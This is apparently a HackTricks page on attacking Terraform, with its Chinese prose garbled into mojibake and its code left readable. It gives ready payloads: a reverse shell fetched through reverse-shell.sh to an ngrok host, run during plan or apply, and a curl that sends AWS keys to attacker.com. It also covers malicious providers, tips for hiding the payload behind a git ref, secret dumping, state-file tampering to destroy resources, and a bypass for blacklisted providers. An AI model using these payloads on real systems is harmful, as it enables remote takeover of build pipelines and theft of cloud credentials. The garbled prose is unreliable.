# Terraform Security

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

### åŸºæœ¬ä¿¡æ¯

[æ¥è‡ªæ–‡æ¡£ï¼š](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform æ˜¯ä¸€ä¸ª **åŸºç¡€è®¾æ–½å³ä»£ç å·¥å…·**ï¼Œå…è®¸æ‚¨åœ¨å¯ç‰ˆæœ¬åŒ–ã€å¯é‡ç”¨å’Œå…±äº«çš„äººç±»å¯è¯»é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ **äº‘å’Œæœ¬åœ°èµ„æº**ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€è‡´çš„å·¥ä½œæµç¨‹æ¥ç®¡ç†å’Œç®¡ç†æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­çš„æ‰€æœ‰åŸºç¡€è®¾æ–½ã€‚Terraform å¯ä»¥ç®¡ç†ä½çº§ç»„ä»¶ï¼Œå¦‚è®¡ç®—ã€å­˜å‚¨å’Œç½‘ç»œèµ„æºï¼Œä»¥åŠé«˜çº§ç»„ä»¶ï¼Œå¦‚ DNS æ¡ç›®å’Œ SaaS åŠŸèƒ½ã€‚

#### Terraform å¦‚ä½•å·¥ä½œï¼Ÿ

Terraform é€šè¿‡å…¶åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ (APIs) åˆ›å»ºå’Œç®¡ç†äº‘å¹³å°å’Œå…¶ä»–æœåŠ¡ä¸Šçš„èµ„æºã€‚æä¾›ç¨‹åºä½¿ Terraform èƒ½å¤Ÿä¸å‡ ä¹ä»»ä½•å…·æœ‰å¯è®¿é—® API çš„å¹³å°æˆ–æœåŠ¡ä¸€èµ·å·¥ä½œã€‚

![](<../.gitbook/assets/image (177).png>)

HashiCorp å’Œ Terraform ç¤¾åŒºå·²ç»ç¼–å†™äº† **è¶…è¿‡ 1700 ä¸ªæä¾›ç¨‹åº** æ¥ç®¡ç†æˆåƒä¸Šä¸‡ç§ä¸åŒç±»å‹çš„èµ„æºå’ŒæœåŠ¡ï¼Œè¿™ä¸ªæ•°å­—è¿˜åœ¨ä¸æ–­å¢é•¿ã€‚æ‚¨å¯ä»¥åœ¨ [Terraform æ³¨å†Œè¡¨](https://registry.terraform.io/) ä¸Šæ‰¾åˆ°æ‰€æœ‰å…¬å¼€å¯ç”¨çš„æä¾›ç¨‹åºï¼ŒåŒ…æ‹¬äºšé©¬é€Šç½‘ç»œæœåŠ¡ (AWS)ã€Azureã€è°·æ­Œäº‘å¹³å° (GCP)ã€Kubernetesã€Helmã€GitHubã€Splunkã€DataDog ç­‰ç­‰ã€‚

æ ¸å¿ƒ Terraform å·¥ä½œæµç¨‹ç”±ä¸‰ä¸ªé˜¶æ®µç»„æˆï¼š

* **å†™å…¥ï¼š** æ‚¨å®šä¹‰èµ„æºï¼Œè¿™äº›èµ„æºå¯èƒ½è·¨å¤šä¸ªäº‘æä¾›å•†å’ŒæœåŠ¡ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯èƒ½ä¼šåˆ›å»ºä¸€ä¸ªé…ç½®ï¼Œä»¥åœ¨å…·æœ‰å®‰å…¨ç»„å’Œè´Ÿè½½å‡è¡¡å™¨çš„è™šæ‹Ÿç§æœ‰äº‘ (VPC) ç½‘ç»œä¸­çš„è™šæ‹Ÿæœºä¸Šéƒ¨ç½²åº”ç”¨ç¨‹åºã€‚
* **è®¡åˆ’ï¼š** Terraform åˆ›å»ºä¸€ä¸ªæ‰§è¡Œè®¡åˆ’ï¼Œæè¿°å®ƒå°†æ ¹æ®ç°æœ‰åŸºç¡€è®¾æ–½å’Œæ‚¨çš„é…ç½®åˆ›å»ºã€æ›´æ–°æˆ–é”€æ¯çš„åŸºç¡€è®¾æ–½ã€‚
* **åº”ç”¨ï¼š** åœ¨æ‰¹å‡†åï¼ŒTerraform æŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ‰§è¡Œæè®®çš„æ“ä½œï¼Œå°Šé‡ä»»ä½•èµ„æºä¾èµ–å…³ç³»ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ›´æ–° VPC çš„å±æ€§å¹¶æ›´æ”¹è¯¥ VPC ä¸­è™šæ‹Ÿæœºçš„æ•°é‡ï¼ŒTerraform å°†åœ¨æ‰©å±•è™šæ‹Ÿæœºä¹‹å‰é‡æ–°åˆ›å»º VPCã€‚

![](<../.gitbook/assets/image (215).png>)

### Terraform å®éªŒå®¤

åªéœ€åœ¨æ‚¨çš„è®¡ç®—æœºä¸Šå®‰è£… terraformã€‚

è¿™é‡Œæœ‰ä¸€ä¸ª [æŒ‡å—](https://learn.hashicorp.com/tutorials/terraform/install-cli)ï¼Œè¿™é‡Œæœ‰ [ä¸‹è½½ terraform çš„æœ€ä½³æ–¹å¼](https://www.terraform.io/downloads)ã€‚

### Terraform ä¸­çš„ RCE

Terraform **æ²¡æœ‰ä¸€ä¸ªæš´éœ²ç½‘é¡µæˆ–ç½‘ç»œæœåŠ¡çš„å¹³å°** æˆ‘ä»¬å¯ä»¥æšä¸¾ï¼Œå› æ­¤ï¼Œå¦¥å terraform çš„å”¯ä¸€æ–¹æ³•æ˜¯ **èƒ½å¤Ÿæ·»åŠ /ä¿®æ”¹ terraform é…ç½®æ–‡ä»¶**ã€‚

ç„¶è€Œï¼Œterraform æ˜¯ä¸€ä¸ª **éå¸¸æ•æ„Ÿçš„ç»„ä»¶**ï¼Œå› ä¸ºå®ƒå°†æ‹¥æœ‰ **ç‰¹æƒè®¿é—®** ä¸åŒä½ç½®ï¼Œä»¥ä¾¿èƒ½å¤Ÿæ­£å¸¸å·¥ä½œã€‚

æ”»å‡»è€…èƒ½å¤Ÿå¦¥åè¿è¡Œ terraform çš„ç³»ç»Ÿçš„ä¸»è¦æ–¹æ³•æ˜¯ **å¦¥åå­˜å‚¨ terraform é…ç½®çš„ä»“åº“**ï¼Œå› ä¸ºåœ¨æŸäº›æ—¶å€™å®ƒä»¬å°†è¢« **è§£é‡Š**ã€‚

å®é™…ä¸Šï¼Œå¸‚é¢ä¸Šæœ‰ä¸€äº›è§£å†³æ–¹æ¡ˆ **åœ¨åˆ›å»º PR åè‡ªåŠ¨æ‰§è¡Œ terraform plan/apply**ï¼Œä¾‹å¦‚ **Atlantis**ï¼š

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

å¦‚æœæ‚¨èƒ½å¤Ÿå¦¥åä¸€ä¸ª terraform æ–‡ä»¶ï¼Œæœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥åœ¨æŸäººæ‰§è¡Œ `terraform plan` æˆ– `terraform apply` æ—¶æ‰§è¡Œ RCEã€‚

#### Terraform plan

Terraform plan æ˜¯ terraform ä¸­ **ä½¿ç”¨æœ€é¢‘ç¹çš„å‘½ä»¤**ï¼Œå¼€å‘äººå‘˜/ä½¿ç”¨ terraform çš„è§£å†³æ–¹æ¡ˆä¸€ç›´åœ¨è°ƒç”¨å®ƒï¼Œå› æ­¤ï¼Œ**è·å¾— RCE çš„æœ€ç®€å•æ–¹æ³•** æ˜¯ç¡®ä¿æ‚¨æ¯’åŒ–ä¸€ä¸ª terraform é…ç½®æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†åœ¨ `terraform plan` ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**ä½¿ç”¨å¤–éƒ¨æä¾›ç¨‹åº**

Terraform æä¾›äº† [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs)ï¼Œå®ƒæä¾›äº†ä¸€ç§åœ¨ Terraform å’Œå¤–éƒ¨ç¨‹åºä¹‹é—´è¿›è¡Œæ¥å£çš„æ–¹æ³•ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ `external` æ•°æ®æºåœ¨ `plan` æœŸé—´è¿è¡Œä»»æ„ä»£ç ã€‚

åœ¨ terraform é…ç½®æ–‡ä»¶ä¸­æ³¨å…¥å¦‚ä¸‹å†…å®¹å°†åœ¨æ‰§è¡Œ `terraform plan` æ—¶æ‰§è¡Œä¸€ä¸ªåå‘ shellï¼š
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**ä½¿ç”¨è‡ªå®šä¹‰æä¾›ç¨‹åº**

æ”»å‡»è€…å¯ä»¥å°†ä¸€ä¸ª [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) å‘é€åˆ° [Terraform Registry](https://registry.terraform.io/)ï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°åŠŸèƒ½åˆ†æ”¯ä¸­çš„ Terraform ä»£ç ä¸­ ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce))ï¼š
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
æä¾›ç¨‹åºåœ¨ `init` ä¸­ä¸‹è½½ï¼Œå¹¶å°†åœ¨æ‰§è¡Œ `plan` æ—¶è¿è¡Œæ¶æ„ä»£ç 

æ‚¨å¯ä»¥åœ¨ [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) æ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹

**ä½¿ç”¨å¤–éƒ¨å¼•ç”¨**

ä¸Šè¿°ä¸¤ç§é€‰é¡¹éƒ½å¾ˆæœ‰ç”¨ï¼Œä½†ä¸å¤Ÿéšè”½ï¼ˆç¬¬äºŒç§æ¯”ç¬¬ä¸€ç§æ›´éšè”½ï¼Œä½†æ›´å¤æ‚ï¼‰ã€‚æ‚¨å¯ä»¥é€šè¿‡éµå¾ªä»¥ä¸‹å»ºè®®ä»¥**æ›´éšè”½çš„æ–¹å¼**æ‰§è¡Œæ­¤æ”»å‡»ï¼š

* ä¸è¦ç›´æ¥å°†åå‘ shell æ·»åŠ åˆ° terraform æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥**åŠ è½½ä¸€ä¸ªåŒ…å«åå‘ shell çš„å¤–éƒ¨èµ„æº**ï¼š
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
æ‚¨å¯ä»¥åœ¨ [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) æ‰¾åˆ° rev shell ä»£ç ã€‚

* åœ¨å¤–éƒ¨èµ„æºä¸­ï¼Œä½¿ç”¨ **ref** åŠŸèƒ½æ¥éšè— **repo ä¸­æŸä¸ªåˆ†æ”¯çš„ terraform rev shell ä»£ç **ï¼Œç±»ä¼¼äºï¼š `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

#### Terraform Apply

å°†æ‰§è¡Œ Terraform apply ä»¥åº”ç”¨æ‰€æœ‰æ›´æ”¹ï¼Œæ‚¨ä¹Ÿå¯ä»¥åˆ©ç”¨å®ƒé€šè¿‡æ³¨å…¥ **ä¸€ä¸ªæ¶æ„çš„ Terraform æ–‡ä»¶ä¸** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
æ‚¨åªéœ€ç¡®ä¿ä»¥ä¸‹æŸäº›æœ‰æ•ˆè½½è·ä»¥ `main.tf` æ–‡ä»¶ç»“å°¾ï¼š
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
éµå¾ª**å‰é¢æŠ€æœ¯çš„å»ºè®®**ï¼Œä»¥**æ›´éšè”½çš„æ–¹å¼ä½¿ç”¨å¤–éƒ¨å¼•ç”¨**æ‰§è¡Œæ­¤æ”»å‡»ã€‚

### Secrets Dumps

æ‚¨å¯ä»¥é€šè¿‡åœ¨ terraform æ–‡ä»¶ä¸­æ·»åŠ ç±»ä¼¼çš„å†…å®¹ï¼Œè¿è¡Œ `terraform apply` æ¥**è½¬å‚¨ terraform ä½¿ç”¨çš„ç§˜å¯†å€¼**ï¼š
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### æ»¥ç”¨ Terraform çŠ¶æ€æ–‡ä»¶

å¦‚æœæ‚¨å¯¹ terraform çŠ¶æ€æ–‡ä»¶å…·æœ‰å†™å…¥æƒé™ä½†æ— æ³•æ›´æ”¹ terraform ä»£ç ï¼Œ[**è¿™é¡¹ç ”ç©¶**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) æä¾›äº†ä¸€äº›æœ‰è¶£çš„é€‰é¡¹æ¥åˆ©ç”¨è¯¥æ–‡ä»¶ï¼š

#### åˆ é™¤èµ„æº <a href="#deleting-resources" id="deleting-resources"></a>

æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥é”€æ¯èµ„æºï¼š

1. **åœ¨çŠ¶æ€æ–‡ä»¶ä¸­æ’å…¥ä¸€ä¸ªæŒ‡å‘è¦é”€æ¯çš„çœŸå®èµ„æºçš„éšæœºåç§°çš„èµ„æº**

å› ä¸º terraform ä¼šçœ‹åˆ°è¯¥èµ„æºä¸åº”è¯¥å­˜åœ¨ï¼Œæ‰€ä»¥å®ƒä¼šé”€æ¯å®ƒï¼ˆæ ¹æ®æŒ‡ç¤ºçš„çœŸå®èµ„æº IDï¼‰ã€‚æ¥è‡ªä¸Šä¸€é¡µçš„ç¤ºä¾‹ï¼š
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **ä»¥æ— æ³•æ›´æ–°çš„æ–¹å¼ä¿®æ”¹è¦åˆ é™¤çš„èµ„æºï¼ˆè¿™æ ·å®ƒå°†è¢«åˆ é™¤å¹¶é‡æ–°åˆ›å»ºï¼‰**

å¯¹äº EC2 å®ä¾‹ï¼Œä¿®æ”¹å®ä¾‹çš„ç±»å‹å°±è¶³ä»¥ä½¿ terraform åˆ é™¤å¹¶é‡æ–°åˆ›å»ºå®ƒã€‚

#### RCE

è¿˜å¯ä»¥ [åˆ›å»ºè‡ªå®šä¹‰æä¾›ç¨‹åº](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider)ï¼Œå¹¶ä»…å°† terraform çŠ¶æ€æ–‡ä»¶ä¸­çš„ä¸€ä¸ªæä¾›ç¨‹åºæ›¿æ¢ä¸ºæ¶æ„æä¾›ç¨‹åºï¼Œæˆ–æ·»åŠ ä¸€ä¸ªå¸¦æœ‰æ¶æ„æä¾›ç¨‹åºçš„ç©ºèµ„æºã€‚åŸå§‹ç ”ç©¶çš„ç¤ºä¾‹ï¼š
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### æ›¿æ¢é»‘åå•æä¾›è€…

å¦‚æœæ‚¨é‡åˆ° `hashicorp/external` è¢«åˆ—å…¥é»‘åå•çš„æƒ…å†µï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼é‡æ–°å®ç° `external` æä¾›è€…ã€‚æ³¨æ„ï¼šæˆ‘ä»¬ä½¿ç”¨ç”± https://registry.terraform.io/providers/nazarewk/external/latest å‘å¸ƒçš„ external æä¾›è€…çš„åˆ†æ”¯ã€‚æ‚¨ä¹Ÿå¯ä»¥å‘å¸ƒè‡ªå·±çš„åˆ†æ”¯æˆ–é‡æ–°å®ç°ã€‚
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
ç„¶åæ‚¨å¯ä»¥åƒå¾€å¸¸ä¸€æ ·ä½¿ç”¨ `external`ã€‚
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
### å®¡è®¡å·¥å…·

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec ä½¿ç”¨é™æ€åˆ†ææ‚¨çš„ terraform ä»£ç æ¥å‘ç°æ½œåœ¨çš„é”™è¯¯é…ç½®ã€‚
* [**terascan**](https://github.com/tenable/terrascan): Terrascan æ˜¯ä¸€ä¸ªç”¨äºåŸºç¡€è®¾æ–½å³ä»£ç çš„é™æ€ä»£ç åˆ†æå™¨ã€‚

### å‚è€ƒèµ„æ–™

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
